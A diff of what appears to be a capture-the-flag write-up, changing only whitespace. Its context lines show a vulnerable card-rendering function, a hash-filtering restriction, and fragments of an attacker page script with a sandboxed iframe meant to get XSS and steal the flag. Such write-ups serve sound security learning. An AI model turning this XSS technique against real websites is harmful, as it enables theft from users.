@@ -6,7 +6,6 @@ Observation on the application:
 - The application is vulnerable to XSS in this code:
 
 '''
-
     function createWaifuCardHTML(file, buttonText, buttonAction) {
         const sanitizedFile = DOMPurify.sanitize(file);
         const imgHTML = `<img src="${sanitizedFile}" class="card-img-top">`;
@@ -18,16 +17,13 @@ Observation on the application:
 - But we can't directly exploit it because there's some restriction here:
 
 '''
-
     function displayClaimedWaifus(paths) {
         if (REGEX_SAVE_PROPS.test(initialHash)) {
             throwAlert("Invalid characters detected in the hash. Please try again.");
         }
         ...snip...
     }
-    ...snip...
-
-    
+    ...snip...    
     ...snip...
     function throwAlert(message) {
         document.location.hash = "";
@@ -42,7 +38,6 @@ Here the step to get xss and steal the flag
 1. Create a page that contains the following code:
 
 '''
-
 <body></body>
 <script>
     const TARGET = "http://proxy"
@@ -77,7 +72,6 @@ Here the step to get xss and steal the flag
 '''
     i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
     document.body.appendChild(i1)
-
 </script>
 '''
 
